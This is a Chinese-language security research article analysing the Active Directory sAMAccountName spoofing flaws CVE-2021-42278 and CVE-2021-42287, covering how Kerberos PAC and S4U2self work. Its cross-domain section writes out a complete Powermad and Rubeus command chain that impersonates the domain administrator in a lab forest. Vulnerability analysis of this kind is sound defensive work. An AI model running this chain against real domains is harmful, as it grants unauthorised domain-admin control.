# SAMAccountName Spoofing域内提权漏洞分析

阅读量 **145954**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2022-01-25 14:30:21

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t018854b3061f66da38.jpg)

## 0x01 漏洞描述

漏洞发布的时候一直有项目，没时间去看这个漏洞，当时只大体看了一下代码，只了解了一下具体利用跟流程，现在对此漏洞做一个分析，并看一下对于跨域此漏洞还能否利用。

Microsoft 发布了补丁解决Windows Active Directory
域控制器的两个漏洞（CVE-2021–42278和CVE-2021–42287）。

CVE-2021–42278允许攻击者使用计算机帐户sAMAccountName欺骗来冒充域控制器，简单来说就是AD没有对域内机器账户做验证，导致sAMAccountName后面没有$也可以以机器用户的身份申请票据。

![](https://p1.ssl.qhimg.com/t01d1bf0b0f6569c6fc.png)

CVE-2021-42287通过伪造域控的机器用户（结尾没有$）进行请求，之后删除或修改用户，请求 S4U2self 票据，DC在 TGS_REP
的阶段找不到结尾没有$的用户后，DC会使用自己的密钥加密 TGS Ticket ，提供一个属于该账户的 PAC，抓取后就得到一个高权限ST。

![](https://p5.ssl.qhimg.com/t0184c78cfd0f031dce.png)

<https://support.microsoft.com/en-us/topic/kb5008102-active-directory-security-accounts-manager-hardening-changes-cve-2021-42278-5975b463-4c95-45e1-831a-d120004e258e>

<https://support.microsoft.com/en-us/topic/kb5008380-authentication-updates-cve-2021-42287-9dafac11-e0d0-4cb8-959a-143bd0201041>

## 0x02 漏洞流程

我们根据 [@cube0x0](https://github.com/cube0x0 "@cube0x0") 写的利用脚本看一下如何利用之后再去进一步分析

首先创建了一个机器账户，如果创建的机器用户名存在则不会创建并退出。

![](https://p3.ssl.qhimg.com/t017a2a97316ad1bb52.png)

添加的机器用户后面需要带$

![](https://p0.ssl.qhimg.com/t0196bfc94f7d806be4.png)

添加完用户后清空SPN的值，那么为什么要清空SPN的值？后面再说

![](https://p5.ssl.qhimg.com/t01144810c35d3f1ca1.png)

将上面创建的机器用户名称也就是samaccountname字段更改为域控的机器名称（后面不加$）

![](https://p5.ssl.qhimg.com/t0139c988ece31f28bb.png)

![](https://p0.ssl.qhimg.com/t0144d89020aee9689d.png)

请求tgt,获取机器账号的tgt

![](https://p5.ssl.qhimg.com/t012b932fed03f3a3e3.png)

![](https://p3.ssl.qhimg.com/t010694f9fb7c0aace3.png)

将samaccountname字段的值恢复为我们指定的值，以便在 KDC 查找时不会找到它

![](https://p2.ssl.qhimg.com/t01d60adb3f586fca56.png)

![](https://p5.ssl.qhimg.com/t010cd78148109b69b2.png)

利用之前获得的TGT票据，通过S4U2self协议向DC请求ST

![](https://p1.ssl.qhimg.com/t0172906656f48ddb09.png)

![](https://p3.ssl.qhimg.com/t0145cbd20ebcb3279f.png)

![](https://p3.ssl.qhimg.com/t01353f94d6e892d0f4.png)

## 0x03 漏洞原理

每个域用户默认可以创建10个机器用户

![](https://p5.ssl.qhimg.com/t017ecc85a7d8fbba7d.png)

###  上面说到的sAMAccountName是什么

sAMAccountName是机器用户中的属性名

UserPrincipalName属性：用户的登录名。该属性由用户主体名称 (UPN) 组成，UPN由UPN 前缀（用户帐户名）和 UPN 后缀（DNS
域名）组成。一般为[zhangsan@wjlab.com](mailto:zhangsan@wjlab.com)（用户名@域名）。

sAMAccountName属性：存储用户登录名或用户对象，该属性是域用户对象的必备属性。SAMAccountName必须等于属性“UserPrincipalName”
的前缀部分。不能超过20个字符，并且不允许使用以下字符：\ / [] :; | =，+ *？<> @“。

当我们创建一个机器用户时，查看sAMAccountName属性，后面是带$的，并且查询与域内用户是查询不到的，查询域内机器用户时才会查到

![](https://p4.ssl.qhimg.com/t01d88d700ad0f76c54.png)

![](https://p5.ssl.qhimg.com/t013b637c5966b0577d.png)

我们将sAMAccountName属性值的$删除掉，会发现查询机器用户后面的$也不见了，而查询域用户的时候会出现这个用户名，并且查询用户的时候显示用户不存在，如果我们利用此漏洞之后查询域内用户的时候也会查询到我们创建的机器用户。

![](https://p2.ssl.qhimg.com/t017764640569e253ec.png)

如果将sAMAccountName属性值改为以存在的值则会显示制定账户已存在，如果设置为不加$结尾但名字相同的值则会修改成功。

![](https://p2.ssl.qhimg.com/t01b38a895ee8caa1d5.png)

![](https://p5.ssl.qhimg.com/t01c0a49524bccad447.png)

###  服务主体名称 (SPN)

服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN。比如我们想要访问某一个服务时，系统会以当前用户身份向域控制器查询SPN为“服务”的记录，找到SPN记录后，用户会再次与KDC进行通信，将KDC发放的TGT作为身份凭据发送给KDC，并将需要访问的SPN发送给KDC。KDC中的身份验证服务（AS）对TGT进行解密，确认无误后TGS将允许访问SPN所对应的服务的票据和该SPN对应的服务地址发送给用户，用户通过票据访问服务。

那么我们为什么要清除SPN呢？因为更改 samAccountName 属性将触发对帐户 SPN
的相应更改，更改它会失败，因为此名称的SPN已存在。为了伪造samAccountName，所以需要通过清除机器用户的“servicePrincipalName”属性来利用此漏洞（清除后SPN将不会再更新）。

添加机器用户后会默认创建4个SPN值

![](https://p1.ssl.qhimg.com/t01932e0f1df2711b83.png)

如果不将SPN的servicePrincipalName属性进行修改，我们把samAccountName改为域控机器用户名（不加$）时会报错。

![](https://p3.ssl.qhimg.com/t0157fbd60d6947bb5a.png)

###  PAC是什么

PAC由KDC在AS-REP的时候返回回来，PAC中主要包含用户的信息以及组的信息。在域中不同权限的用户访问的server也是不一样的，微软为了区别用户能访问哪些server设置了PAC。KDC将PAC中的内容与要访问server的ACL进行比较，查看是否有权限访问此server。

####  PAC认证过程

![](https://p1.ssl.qhimg.com/t01f0814b5948464a59.png)

客户端发送AP-REQ消息向服务器请求身份验证。

服务器操作系统将AP-REQ中的PAC签名转发给DC，在KERB_VERIFY_PAC消息中进行验证。

DC验证PAC，并将结果返回给服务器。

服务器对AP-REQ进行验证，验证成功后发送AP-REP。

####  PAC结构

![](https://p1.ssl.qhimg.com/t01041561fe8e2d1663.png)

PACTYPE是PAC的最顶层结构，它指定PAC_INFO_BUFFER数组中元素的数量。PACTYPE结构用作完整PAC数据的标头。

在PACTYPE结构之后的是PAC_INFO_BUFFER结构的数组，每个PAC_INFO_BUFFER结构定义了PAC缓冲区的类型和字节偏移量。PAC_INFO_BUFFER数组没有定义顺序。因此，PAC_INFO_BUFFER缓冲区的顺序没有意义。但是，一旦密钥分发中心(KDC)和服务器签名生成，缓冲区的顺序绝对不能改变，否则PAC内容的签名验证将失败。

#####  PACTYPE 结构定义：

![](https://p2.ssl.qhimg.com/t01a798c66c9b92d7fd.png)

**cBuffers** ：用于定义Buffers 数组中的条目数。

**Version** ：定义PAC版本。

**Buffers (variable)** ：PAC_INFO_BUFFER结构的数组。

#####  PAC_INFO_BUFFER 结构定义：

![](https://p0.ssl.qhimg.com/t0114d959878c4a6541.png)

**ulType** ：描述了包含在Offset处的缓冲区中的数据类型。

0x00000001  
登录信息。PAC结构必须包含一个这种类型的缓冲区。必须忽略附加的登录信息缓冲区。

0x00000002  
凭证信息。PAC结构不应该包含多个这种类型的缓冲区。在接收时必须忽略第二个或后续的凭据信息缓冲区。

0x00000006  
服务器校验和。PAC结构必须包含一个这种类型的缓冲区。必须忽略额外的登录服务器校验和缓冲区。

0x00000007  
KDC校验和。PAC结构必须包含一个这种类型的缓冲区。必须忽略额外的KDC校验和缓冲区。

0x0000000A  
客户端名称和票据信息。PAC结构必须包含一个这种类型的缓冲区。必须忽略额外的客户端和票据信息缓冲区。

0x0000000B  
受约束的委派信息。PAC结构必须包含一个此类型的缓冲区，以便为S4U2proxy请求提供服务，否则不包含任何缓冲区。必须忽略其他受约束的委派信息缓冲区。

0x0000000C  
用户主体名(UPN)和域名系统(DNS)信息。PAC结构不应该包含多个这种类型的缓冲区。第二次或后续的UPN和DNS信息缓冲区必须在接收时被忽略。

0x0000000D  
客户索赔信息。PAC结构不应该包含多个这种类型的缓冲区。必须忽略其他客户端索赔信息缓冲区。

0x0000000E  
设备信息。PAC结构不应该包含多个这种类型的缓冲区。必须忽略附加的设备信息缓冲区。

0x0000000F  
设备声明信息。PAC结构不应该包含多个这种类型的缓冲区。必须忽略其他设备声明信息缓冲区。

0x00000010  
票务校验和。PAC结构不应该包含一个以上的这种类型的缓冲区。必须忽略额外的票证校验和缓冲区

**cbBufferSize** ：包含位于Offset的PAC中缓冲区的字节大小。

**Offset** ：包含从PACTYPE结构开始到缓冲区开始的偏移量(以字节为单位)。数据偏移量必须是8的倍数。

KERB_VALIDATION_INFO
结构定义了DC提供的用户登录和授权信息，指向KERB_VALIDATION_INFO结构体的指针被序列化为一个字节数组，然后放在最顶层PACTYPE结构体的Buffers数组之后，在Buffers数组中相应PAC_INFO_BUFFER结构体的offset字段中指定的偏移量处。PAC_INFO_BUFFER结构对应的ulType字段设置为0x00000001，定义了
DC 提供的用户登录信息。

#####  KERB_VALIDATION_INFO 结构定义：

![](https://p2.ssl.qhimg.com/t01b62bc23ef3b3aa75.png)

PAC整体是一个AuthorizationData结构。外层ad-type为aD-IF-RELEVANT，ad-data内部也是一个AuthorizationData结构，内部ad-type为aD-WIN2K-PAC，而内部的ad-data为一个PACTYPE的结构体和几个PAC_INFO_BUFFER 结构数组。

![](https://p5.ssl.qhimg.com/t01444bcdfffc7dcc07.png)

申请的PAC为机器用户

![](https://p4.ssl.qhimg.com/t0193e5829261d78735.png)

可以看到域用户组的SID后缀值为513，机器用户组的SID后缀为515，域管组的SID后缀为512，所以上图PAC中显示的组为机器用户的组。

![](https://p0.ssl.qhimg.com/t010c053d4cc5090d37.png)

![](https://p4.ssl.qhimg.com/t0177f058790bded53c.png)

![](https://p1.ssl.qhimg.com/t014b25dabe60538cd0.png)

###  S4U是什么

微软在windows server 2003中引入了约束委派，对Kerberos协议进行了拓展，引入了S4U，其中S4U支持两个子协议：Service
for User to Self (S4U2Self)和 Service for User to Proxy
(S4U2proxy)，这两个扩展都允许服务代表用户从KDC请求票证。S4U2self扩展允许服务代表特定的某用户向KDC请求该服务的可转发票据TGT。S4U2proxy可以以用户的名义请求其它服务的ST。想要使用s4u2self进行请求的前提条件是服务已经有通过KDC验证的TGT，约束委派就是限制了S4U2proxy扩展的范围。

下面是微软官方关于 S4U2self 和 S4U2proxy
工作过程的示意图，虚线上面为S4U2self，虚线下面为S4U2proxy，S4U2proxy主要用于服务委派。漏洞主要出在S4U2self。

![](https://p0.ssl.qhimg.com/t01e20110e5df8abb86.png)

PA-FOR-USER padata类型定义：

![](https://p1.ssl.qhimg.com/t013b2f091beaf4205a.png)

PA-FOR-USER字段是S4U2Self协议才有的字段

![](https://p1.ssl.qhimg.com/t01082f01d479e3c2d4.png)

如果没有用到S4U2Self协议是pA-PAC-OPTIONS字段

![](https://p3.ssl.qhimg.com/t01db75744eb1056304.png)

KDC收到客户端发来的TGS-REQ S4U2Self协议，会重新生成PAC，然后放在ST服务票据中，并不是复制之前TGT里的PAC。

## 0x04 漏洞流程分析

使用上面的利用脚本进行抓包分析，此漏洞是利用kerberos流程中，处理S4U2Self时的逻辑问题和重新生成高权限的PAC问题。

![](https://p3.ssl.qhimg.com/t0156791e8d9bcc5377.png)

AS-REQ：

可以看到在AS-REQ 里是允许携带pac的，并不是像利用工具名写的no pac。

![](https://p1.ssl.qhimg.com/t0100bc1ddbe0d0f335.png)

AS-REP：

AS-REP为正常请求的返回包

![](https://p4.ssl.qhimg.com/t01f76144632a9686c3.png)

我们看一下里面PAC信息，这里不具体说了，可以看一下上面的PAC结构。可以看到现在请求的是机器用户，并且Acct Name字段为域控的机器用户名（不加$）

![](https://p5.ssl.qhimg.com/t014da777007779f506.png)

TGS-REQ：

可以看到，具有SPN的账户也就是我们的机器账户，是以Administrator的身份请求服务票据

![](https://p3.ssl.qhimg.com/t01a1e896d8e004ddf3.png)

![](https://p4.ssl.qhimg.com/t0172422c9d1cc8a02a.png)

TGS-REP：

来看一下TGS-REP中的PAC内容，Acct Name变成了Administrator，User
RID为500，500为Administrator专有的sid后缀。Group RID为513，513为域用户组。

![](https://p1.ssl.qhimg.com/t01b0bfbfae67c40f6e.png)

那么为什么Group RID为513而不是512域管组呢？我们看Administrator的属性可以发现，Administrator的主要组为Domain
Users ，而不是Domain Admins ，所以在TGS-REP中显示的是513而不是512。

![](https://p5.ssl.qhimg.com/t012dc8de1fe4fa0ef3.png)

我们将AS-REP的PAC与TGS-REP中的PAC进行对比可以发现AS-REP返回的PAC的权限为普通机器用户，而TGS-REP返回的PAC为Administrator权限

![](https://p2.ssl.qhimg.com/t015a75bac1b4cf0609.png)

所以到这里这个漏洞是因为申请TGT后原来的机器账户消失，TGS找不到这个机器账户所以自动使用DC$的身份去创建ST，于是就生成了域管权限的ST。

###  总结

所以漏洞其实是首先创建一个机器用户。之后清空SPN为了不与域控的SPN重复，导致从而不能修改sAMAccountName。使用CVE-2021-42278对机器用户的sAMAccountName进行修改，修改为域控同样的机器名（不加$）,然后利用KDC处理S4U2Self请求时的漏洞进行重新生成PAC导致权限提升。

## 0x05 跨域

###  两个域为双向信任关系

A域：wjlab3.com

B域：wjlab2.com

A域域控：WIN-Q4E825O0UIA.wjlab3.com

B域域控：wjlab2dc1.wjlab2.com

假设现在拥有A域的普通域账号qt\wjlab3.com

我们测试的时候发现使用在A域与B域为双向信任关系的时候，通过A域的普通域账号可以在B域内创建机器用户

我们使用Powermad.ps1来进行演示

在A域内普通用户机器上，以当前普通域账号qt\wjlab3.com 在B域内创建一个qtwjlab  
`New-MachineAccount -MachineAccount qtwjlab -Domain wjlab2.com -Password
$(ConvertTo-SecureString "qwer1234" -AsPlainText -Force)`

![](https://p0.ssl.qhimg.com/t018b599f110e6cb768.png)

清空qtwjlab的SPN信息  
`Set-DomainObject "CN=qtwjlab,CN=Computers,DC=wjlab2,DC=com" -Clear
'serviceprincipalname' -Verbose`

![](https://p0.ssl.qhimg.com/t018668ac4691a56efe.png)

修改机器名称为B域域控的机器名  
`Set-MachineAccountAttribute -MachineAccount "qtwjlab" -Value "wjlab2dc1"
-domain wjlab2.com -Attribute samaccountname -Verbose`

![](https://p3.ssl.qhimg.com/t013c553dac4a676368.png)

向B域中请求的更改为域控名samaccountname的tgt  
`Rubeus.exe asktgt /user:"wjlab2dc1" /password:"qwer1234" /domain:"wjlab2.com"
/dc:"wjlab2dc1.wjlab2.com" /nowrap`

![](https://p0.ssl.qhimg.com/t011296f7310c8a385d.png)

修改机器名称改为随便的用户名  
`Set-MachineAccountAttribute -MachineAccount "qtwjlab" -Value "qtwjlab"
-domain wjlab2.com -Attribute samaccountname -Verbose`

![](https://p0.ssl.qhimg.com/t01f364c95346b76e33.png)

获取目标ST  
`Rubeus.exe s4u /self /impersonateuser:"administrator"
/altservice:"cifs/wjlab2dc1.wjlab2.com" /dc:"wjlab2dc1.wjlab2.com" /ptt
/ticket:[Base64 TGT]`

![](https://p5.ssl.qhimg.com/t01ca767a55af8114d3.png)

通过A域请求B域

![](https://p2.ssl.qhimg.com/t01b49de4f332c7cb0b.png)

###  子父域关系

父域：wjlab2.com

子域：user.wjlab2.com

父域域控：wjlab2dc1.wjlab2.com

子域域控：WIN-IAIF2RCT7UL.user.wjlab2.com

我们从子域的一台域内机器进行测试，用户为子域内的用户qq

在子域内普通用户机器上，以当前普通域账号qq\user.wjlab2.com 在父域内创建一个qtwjlab002  
`New-MachineAccount -MachineAccount qtwjlab002 -Domain wjlab2.com -Password
$(ConvertTo-SecureString "qwer1234" -AsPlainText -Force)`

![](https://p0.ssl.qhimg.com/t01a47cf9d214143c09.png)

清空父域中的qtwjlab002的SPN信息  
`Set-DomainObject "CN=qtwjlab002,CN=Computers,DC=wjlab2,DC=com" -Clear
'serviceprincipalname' -Verbose`

![](https://p4.ssl.qhimg.com/t01dfb20ea274fc9389.png)

修改机器名称为父域域控的机器名  
`Set-MachineAccountAttribute -MachineAccount "qtwjlab002" -Value "wjlab2dc1"
-domain wjlab2.com -Attribute samaccountname -Verbose`

![](https://p1.ssl.qhimg.com/t0192dcdee8501e29b7.png)

向父域中请求的更改为域控名samaccountname的tgt  
`Rubeus.exe asktgt /user:"wjlab2dc1" /password:"qwer1234" /domain:"wjlab2.com"
/dc:"wjlab2dc1.wjlab2.com" /nowrap`

![](https://p0.ssl.qhimg.com/t0197cacc2d7b8718d0.png)

修改机器名称改为随便的用户名  
`Set-MachineAccountAttribute -MachineAccount "qtwjlab002" -Value "qtwjlab002"
-domain wjlab2.com -Attribute samaccountname -Verbose`

![](https://p4.ssl.qhimg.com/t01c7f8076e336be75c.png)

获取目标ST  
`Rubeus.exe s4u /self /impersonateuser:"administrator"
/altservice:"cifs/wjlab2dc1.wjlab2.com" /dc:"wjlab2dc1.wjlab2.com" /ptt
/ticket:[Base64 TGT]`

![](https://p1.ssl.qhimg.com/t013c64e5bd3ac6890c.png)

通过子域普通用户请求父域域控

![](https://p4.ssl.qhimg.com/t01095be78aac3fcb6e.png)

在这里我们可以看到此漏洞可以进行跨域利用，主要是因为通过信任域，在一个域中可以向另一个域进行域机器用户创建并修改其属性，从而导致可以利用。那么如果msDS-AdditionalDnsHostName
属性为0的话，那就无法创建机器用户，这个漏洞就利用不了了吗？如果域内管理员配置不当，导致某个域用户的ACL拥有了修改机器用户属性的权限，那么只要找到此用户就可以使用此用户进行利用。

## 0x06 参考

<https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/1fb9caca-449f-4183-8f7a-1a5fc7e7290a?redirectedfrom=MSDN>  
<https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13>  
<https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/aceb70de-40f0-4409-87fa-df00ca145f5a>  
<https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html>  
<https://exploit.ph/more-samaccountname-impersonation.html>  
<https://mp.weixin.qq.com/s/Ar8u_gXh2i3GEcqdhOD8wA>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **吴钩实验室** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/266883](/post/id/266883)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [提权](/tag/提权)
  * [域安全](/tag/域安全)

 **+1** __0赞

 __收藏

![](https://p1.ssl.qhimg.com/t01198106f19acef99b.png) 吴钩实验室

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

